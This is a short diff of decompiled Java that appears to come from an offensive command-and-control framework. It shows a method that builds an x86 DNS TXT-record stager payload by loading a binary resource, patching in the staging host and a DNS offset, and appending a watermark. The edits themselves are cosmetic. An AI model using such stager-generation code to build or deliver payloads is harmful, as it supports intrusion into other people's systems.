@@ -22,7 +22,7 @@ public abstract class GenericDNSStagerX86 extends GenericStager {
 
    public byte[] generate() {
       String var1 = CommonUtils.bString(CommonUtils.readResource("resources/dnsstager.bin"));
-      String var2 = this.getConfig().pad(this.getHost() + '\u0000', 60);
+      String var2 = this.getConfig().pad(this.getHost() + "\u0000", 60);
       if (var2.length() > 60) {
          CommonUtils.print_error("DNS Staging Host '" + var2 + "' is too long! (DNS TXT record stager will crash!)");
       }
@@ -32,7 +32,8 @@ public abstract class GenericDNSStagerX86 extends GenericStager {
       Packer var4 = new Packer();
       var4.little();
       var4.addInt(this.getConfig().getDNSOffset());
-      var1 = CommonUtils.replaceAt(var1, CommonUtils.bString(var4.getBytes()), 509) + this.getConfig().getWatermark();
+      String var10000 = CommonUtils.replaceAt(var1, CommonUtils.bString(var4.getBytes()), 509);
+      var1 = var10000 + this.getConfig().getWatermark();
       return CommonUtils.toBytes(var1);
    }
 }
